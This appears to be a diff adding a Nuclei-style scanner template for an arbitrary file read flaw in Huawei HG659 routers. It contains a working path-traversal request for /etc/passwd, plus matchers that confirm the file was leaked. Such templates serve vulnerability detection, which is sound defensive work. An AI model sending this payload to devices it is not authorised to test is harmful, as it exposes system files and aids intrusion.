@@ -1,0 +1,27 @@
+id: huawei-hg659-arbitrary-file-read
+info:
+  name: Huawei HG659 Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,huawei
+http:
+  - raw:
+      - |
+        GET /lib///....//....//....//....//....//....//....//....//etc//passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:86.0) Gecko/20100101 Firefox/86.0
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
